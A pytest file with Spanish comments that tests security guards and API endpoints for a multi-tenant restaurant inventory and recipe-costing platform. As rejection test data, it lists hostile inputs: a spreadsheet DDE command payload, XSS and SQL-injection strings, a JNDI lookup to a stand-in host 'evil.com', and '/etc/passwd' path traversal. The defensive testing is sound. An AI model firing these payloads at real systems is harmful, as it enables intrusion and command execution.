"""
Pruebas unitarias e integradas en memoria para Fase 4 (`tests/unit/test_phase4_guards_and_routers.py`):
- Guardias en `src/core/guards/` (`rbac_dependencies`, `file_magic_guard`, `xss_sanitizer`, `rate_limiter`)
- Routers y Schemas (`extra="forbid"`, `Decimal`) de los 10 módulos en `src/modules/*/presentation/`.
"""
from __future__ import annotations

import base64
import io
import zipfile
from decimal import Decimal

import httpx
import pytest

from src.core.exceptions import SecurityValidationError
from src.core.guards import (
    RequireGlobalPermission,
    RequireTenantPermission,
    SlidingWindowRateLimiter,
    clear_revoked_sessions,
    get_rate_limiter,
    revoke_session_token,
    sanitize_spreadsheet_cell,
    sanitize_text_input,
    validate_file_magic_bytes,
    validate_no_path_traversal,
)
from src.core.security import create_access_token

pytestmark = pytest.mark.unit


def _make_valid_xlsx_bytes(*, entry_name: str = "xl/workbook.xml", payload_size: int = 128) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, mode="w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(entry_name, "<workbook/>" + ("A" * payload_size))
    return buf.getvalue()


def test_rbac_guard_instantiation_requires_three_levels() -> None:
    """Verifica que `RequireTenantPermission` y `RequireGlobalPermission` rechacen códigos que no sean de 3 niveles."""
    g1 = RequireTenantPermission("inventory.mermas.approve")
    g2 = RequireGlobalPermission("tenancy.holdings.create")
    assert g1.permission_code == "inventory.mermas.approve"
    assert g2.permission_code == "tenancy.holdings.create"

    with pytest.raises(ValueError, match="3-level"):
        RequireTenantPermission("inventory.mermas")
    with pytest.raises(ValueError, match="3-level"):
        RequireGlobalPermission("InvalidCamelCase.Perm.Read")


def test_file_magic_guard_and_spreadsheet_sanitizer() -> None:
    """Verifica Magic Bytes, bloqueo de spoofing ejecutable, Zip Bombs y Formula Injection."""
    png_bytes = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR"
    assert validate_file_magic_bytes(png_bytes, "plato.png") == "image/png"

    pdf_bytes = b"%PDF-1.7\n1 0 obj\n<<>>\nendobj\n"
    assert validate_file_magic_bytes(pdf_bytes, "factura.pdf") == "application/pdf"

    webp_bytes = b"RIFF\x24\x00\x00\x00WEBPVP8 "
    assert validate_file_magic_bytes(webp_bytes, "foto.webp") == "image/webp"

    xlsx_bytes = _make_valid_xlsx_bytes()
    assert (
        validate_file_magic_bytes(xlsx_bytes, "catalogo.xlsx")
        == "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
    )

    # Spoofing: ejecutable MZ o ELF renombrado a .png
    with pytest.raises(SecurityValidationError):
        validate_file_magic_bytes(b"MZ\x90\x00\x03\x00\x00\x00", "malware.png")

    with pytest.raises(SecurityValidationError):
        validate_file_magic_bytes(b"\x7fELF\x02\x01\x01\x00", "exploit.png")

    # Path traversal dentro de un archivo .xlsx
    bad_zip = _make_valid_xlsx_bytes(entry_name="../../etc/passwd")
    with pytest.raises(SecurityValidationError):
        validate_file_magic_bytes(bad_zip, "traversal.xlsx")

    # Zip Bomb (ratio > 50x con > 1 MB descomprimido)
    bomb_zip = _make_valid_xlsx_bytes(payload_size=2 * 1024 * 1024)
    with pytest.raises(SecurityValidationError):
        validate_file_magic_bytes(bomb_zip, "bomb.xlsx")

    # Formula Injection / DDE
    assert sanitize_spreadsheet_cell("=SUM(A1:A5)") == "'=SUM(A1:A5)"
    assert sanitize_spreadsheet_cell("Pollo King") == "Pollo King"
    with pytest.raises(SecurityValidationError):
        sanitize_spreadsheet_cell("=cmd|'/c calc'!A0")


def test_xss_ssti_sqli_and_path_traversal_sanitizers() -> None:
    """Verifica el bloqueo de políglotas XSS, SSTI, SQLi y Path Traversal."""
    assert sanitize_text_input("Lomo Vetado Premium") == "Lomo Vetado Premium"
    assert validate_no_path_traversal("products/prod_01/thumb.webp") == "products/prod_01/thumb.webp"

    for malicious in (
        "<script>alert(1)</script>",
        "javascript:alert(document.cookie)",
        "<img src=x onerror=alert(1)>",
        "{{7*7}}",
        "${jndi:ldap://evil.com/a}",
        "' OR '1'='1",
        "1; DROP TABLE users",
        "../../etc/passwd",
        "bad\x00null",
    ):
        with pytest.raises(SecurityValidationError):
            sanitize_text_input(malicious)

    with pytest.raises(SecurityValidationError):
        validate_no_path_traversal("../secret/.env")


def test_sliding_window_rate_limiter_profiles_and_isolation() -> None:
    """Verifica cuotas `auth` (5/60s), `api` (120/60s), `ai` (20/60s) y aislamiento por namespace."""
    limiter = SlidingWindowRateLimiter()
    for i in range(5):
        res = limiter.check_and_consume(
            profile="auth",
            subject_key="10.0.0.1",
            env_namespace="wt_test_a",
            now_monotonic=100.0 + i,
        )
        assert res.allowed is True

    blocked = limiter.check_and_consume(
        profile="auth",
        subject_key="10.0.0.1",
        env_namespace="wt_test_a",
        now_monotonic=105.0,
    )
    assert blocked.allowed is False
    assert blocked.retry_after_seconds >= 1

    # Otro namespace está completamente aislado
    other_ns = limiter.check_and_consume(
        profile="auth",
        subject_key="10.0.0.1",
        env_namespace="wt_test_b",
        now_monotonic=105.0,
    )
    assert other_ns.allowed is True


async def test_all_ten_module_routers_and_rbac_enforcement(
    async_client: httpx.AsyncClient,
) -> None:
    """Verifica autenticación, RBAC 3 niveles, bloqueo Cross-Tenant y endpoints de los 10 módulos."""
    from src.modules.inventory.presentation.router import _inventory_service

    clear_revoked_sessions()
    get_rate_limiter().reset()
    _inventory_service.reset()

    # 1. Sin token -> HTTP 401 RFC 7807
    unauth = await async_client.get("/api/v1/catalog/products")
    assert unauth.status_code == 401
    assert unauth.json()["error_code"] == "AUTHENTICATION_REQUIRED"

    # 2. Token de trabajador con permisos acotados en tenant_rest_a
    worker_token = create_access_token(
        user_id=42,
        holding_id="holding_01",
        tenant_id="tenant_rest_a",
        hierarchy_rank=30,
        contracted_modules=["catalog", "inventory", "recipes", "procurement", "operations", "analytics", "oppyfy", "audit", "settings", "tenancy"],
        role_grants=[
            "catalog.products.create",
            "catalog.products.read",
            "catalog.units.convert",
            "catalog.products.import_excel",
            "catalog.media.upload",
            "inventory.kardex.write",
            "inventory.kardex.read",
            "inventory.counts.submit",
            "inventory.mermas.create",
            "recipes.escandallos.write",
            "recipes.escandallos.read",
            "recipes.margins.simulate",
            "procurement.orders.create",
            "procurement.orders.read",
            "procurement.receptions.reconcile",
            "procurement.invoices.ocr",
            "operations.sales.create",
            "operations.buffet.calculate",
            "operations.events.create",
            "analytics.executive_summary.read",
            "analytics.food_cost.read",
            "oppyfy.assistant.chat",
            "oppyfy.rbac_domains.read",
            "oppyfy.credits.read",
            "audit.rbac_ledger.read",
            "audit.activity_ledger.read",
            "audit.activity_ledger.append",
            "tenancy.quotas.read",
            "tenancy.storage_quotas.read",
            "settings.roles.read",
        ],
        accessible_tenants=["tenant_rest_a"],
    )
    worker_headers = {
        "Authorization": f"Bearer {worker_token}",
        "X-Tenant-ID": "tenant_rest_a",
    }

    # 3. Intento Cross-Tenant IDOR hacia tenant_rest_b -> HTTP 403
    idor_resp = await async_client.get(
        "/api/v1/catalog/products",
        headers={
            "Authorization": f"Bearer {worker_token}",
            "X-Tenant-ID": "tenant_rest_b",
        },
    )
    assert idor_resp.status_code == 403
    assert idor_resp.json()["error_code"] == "CROSS_TENANT_ACCESS_VIOLATION"

    # 4. Módulo Catalog: crear producto, convertir unidades, importar excel, subir imagen WebP
    prod_resp = await async_client.post(
        "/api/v1/catalog/products",
        headers=worker_headers,
        json={
            "sku": "CARNE-001",
            "nombre": "Lomo Liso",
            "marca_comercial": "Pollo King",
            "unidad_compra": "caja",
            "unidad_almacen": "kg",
            "unidad_receta": "g",
            "factor_compra_a_almacen": "10",
            "factor_almacen_a_receta": "1000",
            "costo_compra_neto": "50000",
        },
    )
    assert prod_resp.status_code == 201
    assert Decimal(prod_resp.json()["costo_unitario_almacen"]) == Decimal("5000")

    conv_resp = await async_client.post(
        "/api/v1/catalog/units/convert",
        headers=worker_headers,
        json={
            "cantidad_compra": "2",
            "costo_compra_neto": "10000",
            "factor_compra_a_almacen": "5",
            "factor_almacen_a_receta": "1000",
        },
    )
    assert conv_resp.status_code == 200
    assert Decimal(conv_resp.json()["cantidad_almacen"]) == Decimal("10")

    excel_resp = await async_client.post(
        "/api/v1/catalog/import-excel",
        headers=worker_headers,
        json={
            "rows": [
                {
                    "sku": "INS-10",
                    "nombre": "Harina Flor",
                    "unidad_compra": "saco",
                    "costo_compra_neto": "22000",
                }
            ],
            "jev_confidence": "0.95",
        },
    )
    assert excel_resp.status_code == 200
    assert excel_resp.json()["imported_count"] == 1

    webp_b64 = base64.b64encode(b"RIFF\x24\x00\x00\x00WEBPVP8 ").decode("ascii")
    media_resp = await async_client.post(
        "/api/v1/catalog/media/upload",
        headers=worker_headers,
        json={
            "filename": "lomo.webp",
            "category": "products",
            "entity_id": "prod_1",
            "content_base64": webp_b64,
        },
    )
    assert media_resp.status_code == 201
    assert media_resp.json()["thumb_object_key"].endswith("/products/prod_1/thumb.webp")

    # 5. Módulo Inventory: Kardex, conteo físico y reporte/aprobación de merma
    kardex_resp = await async_client.post(
        "/api/v1/inventory/kardex/movements",
        headers=worker_headers,
        json={
            "producto_id": 10,
            "bodega_id": 1,
            "movement_type": "ENTRADA",
            "quantity": "25.5",
            "unit_cost": "1200",
        },
    )
    assert kardex_resp.status_code == 201
    assert Decimal(kardex_resp.json()["resulting_balance"]) == Decimal("25.5")

    count_resp = await async_client.post(
        "/api/v1/inventory/counts",
        headers=worker_headers,
        json={
            "bodega_id": 1,
            "items": [
                {"producto_id": 30, "counted_quantity": "10", "unit_cost": "500"},
                {"producto_id": 10, "counted_quantity": "30", "unit_cost": "1200"},
            ],
        },
    )
    assert count_resp.status_code == 200
    assert count_resp.json()["locked_product_ids_asc"] == [10, 30]

    merma_resp = await async_client.post(
        "/api/v1/inventory/mermas",
        headers=worker_headers,
        json={
            "producto_id": 10,
            "bodega_id": 1,
            "quantity": "2",
            "unit_cost": "30000",
            "reason": "Corte de cadena de frío en cámara 2",
        },
    )
    assert merma_resp.status_code == 201
    assert merma_resp.json()["status"] == "PENDIENTE"

    # 6. Módulo Recipes: Escandallo y simulación de margen
    esc_resp = await async_client.post(
        "/api/v1/recipes/escandallos",
        headers=worker_headers,
        json={
            "recipe_id": 101,
            "name": "Lomo a lo Pobre",
            "yield_portions": "1",
            "net_price": "10000",
            "lines": [
                {"ingredient_id": 10, "quantity": "0.25", "unit_cost": "12000", "waste_pct": "0"}
            ],
        },
    )
    assert esc_resp.status_code == 201
    assert Decimal(esc_resp.json()["food_cost_pct"]) == Decimal("30.00")

    sim_resp = await async_client.post(
        "/api/v1/recipes/simulate-margin",
        headers=worker_headers,
        json={"portion_cost": "3000", "proposed_net_price": "12000"},
    )
    assert sim_resp.status_code == 200
    assert Decimal(sim_resp.json()["margin_pct"]) == Decimal("75.00")

    # 7. Módulo Procurement: OC, Conciliación 3 vías y OCR
    po_resp = await async_client.post(
        "/api/v1/procurement/orders",
        headers=worker_headers,
        json={
            "po_number": "OC-2026-001",
            "supplier_id": 500,
            "supplier_name": "Pollo King",
            "lines": [{"producto_id": 10, "quantity": "10", "unit_cost": "4500"}],
        },
    )
    assert po_resp.status_code == 201
    assert po_resp.json()["supplier_name"] == "Pollo King"

    rec_resp = await async_client.post(
        "/api/v1/procurement/receptions/reconcile",
        headers=worker_headers,
        json={
            "po_number": "OC-2026-001",
            "order_lines": [{"producto_id": 10, "quantity": "10", "unit_cost": "4500"}],
            "receipt_lines": [{"producto_id": 10, "quantity": "10", "unit_cost": "4500"}],
            "invoice_lines": [{"producto_id": 10, "quantity": "10", "unit_cost": "4500"}],
        },
    )
    assert rec_resp.status_code == 200
    assert rec_resp.json()["status"] == "MATCHED"

    # 8. Módulo Operations: Ventas POS, Buffet y Eventos
    sale_resp = await async_client.post(
        "/api/v1/operations/sales",
        headers=worker_headers,
        json={
            "bodega_id": 1,
            "items": [{"recipe_id": 101, "portions": "2"}],
            "recipe_ingredients": {"101": {"10": "0.25"}},
        },
    )
    assert sale_resp.status_code == 201

    buffet_resp = await async_client.post(
        "/api/v1/operations/buffet",
        headers=worker_headers,
        json={
            "service_name": "Buffet Ejecutivo",
            "total_buffet_cost": "250000",
            "pax": 50,
            "leftover_value": "50000",
        },
    )
    assert buffet_resp.status_code == 200
    assert Decimal(buffet_resp.json()["cost_per_pax"]) == Decimal("4000.00")

    # 9. Módulo Analytics: Resumen Ejecutivo y Varianza de Food Cost
    ana_resp = await async_client.post(
        "/api/v1/analytics/executive-summary",
        headers=worker_headers,
        json={
            "theoretical_cost": "300000",
            "opening_inventory": "100000",
            "purchases": "330000",
            "closing_inventory": "100000",
            "net_sales": "1000000",
        },
    )
    assert ana_resp.status_code == 200
    assert ana_resp.json()["alert"] is True

    # 10. Módulo OppyFy (oppy_ai), Audit, Tenancy e Identity + Kill-Switch
    chat_resp = await async_client.post(
        "/api/v1/oppyfy/chat",
        headers=worker_headers,
        json={
            "prompt_text": "¿Cuál es la receta del Lomo a lo Pobre?",
            "target_subdomain_slug": "recipes_kitchen",
            "can_view_costs": False,
        },
    )
    assert chat_resp.status_code == 200
    assert "[REDACTED_COST]" in chat_resp.json()["answer_text"]

    audit_del = await async_client.delete(
        "/api/v1/audit/activity/evt-immutable-001",
        headers=worker_headers,
    )
    assert audit_del.status_code == 403
    assert audit_del.json()["error_code"] == "AUDIT_APPEND_ONLY_VIOLATION"

    seats_resp = await async_client.get("/api/v1/tenancy/quotas/seats", headers=worker_headers)
    assert seats_resp.status_code == 200

    # Revocar sesión mediante Kill-Switch -> el mismo JWT pasa a responder HTTP 401 inmediatamente
    revoke_session_token(user_id=42)
    revoked_resp = await async_client.get("/api/v1/catalog/products", headers=worker_headers)
    assert revoked_resp.status_code == 401
    assert revoked_resp.json()["error_code"] == "SESSION_REVOKED_KILLSWITCH"
    clear_revoked_sessions()


@pytest.mark.asyncio
async def test_tenancy_dashboard_summary_and_admin_endpoints(
    async_client: httpx.AsyncClient,
) -> None:
    """Verifica los endpoints administrativos globales para el Panel de Control (/admin)."""
    admin_token = create_access_token(
        user_id=1,
        holding_id=None,
        tenant_id=None,
        is_superuser_god=True,
        is_global_staff=True,
        hierarchy_rank=0,
        contracted_modules=["all"],
        role_grants=[
            "tenancy.dashboard.read",
            "tenancy.holdings.read",
            "tenancy.holdings.create",
            "tenancy.legal_entities.read",
            "tenancy.legal_entities.create",
            "tenancy.tenants.read",
            "tenancy.tenants.provision",
            "identity.users.read",
        ],
        accessible_tenants=[],
    )
    admin_headers = {"Authorization": f"Bearer {admin_token}"}

    # 1. Dashboard summary inicial: holdings=0, legal_entities=0, tenants=0, users=1 (Genesis)
    summary_resp = await async_client.get(
        "/api/v1/tenancy/dashboard/summary",
        headers=admin_headers,
    )
    assert summary_resp.status_code == 200
    summary_data = summary_resp.json()
    assert summary_data["users"] >= 1
    assert summary_data["holdings"] >= 0

    # 2. Listar usuarios globales -> debe contener al Genesis SuperUser
    users_resp = await async_client.get(
        "/api/v1/identity/users",
        headers=admin_headers,
    )
    assert users_resp.status_code == 200
    users_data = users_resp.json()
    assert len(users_data) >= 1
    assert any(u["is_superuser"] is True for u in users_data)

    # 3. Listar tenants y legal entities inicialmente
    tenants_resp = await async_client.get(
        "/api/v1/tenancy/tenants",
        headers=admin_headers,
    )
    assert tenants_resp.status_code == 200
    assert isinstance(tenants_resp.json(), list)

    le_resp = await async_client.get(
        "/api/v1/tenancy/legal-entities",
        headers=admin_headers,
    )
    assert le_resp.status_code == 200
    assert isinstance(le_resp.json(), list)

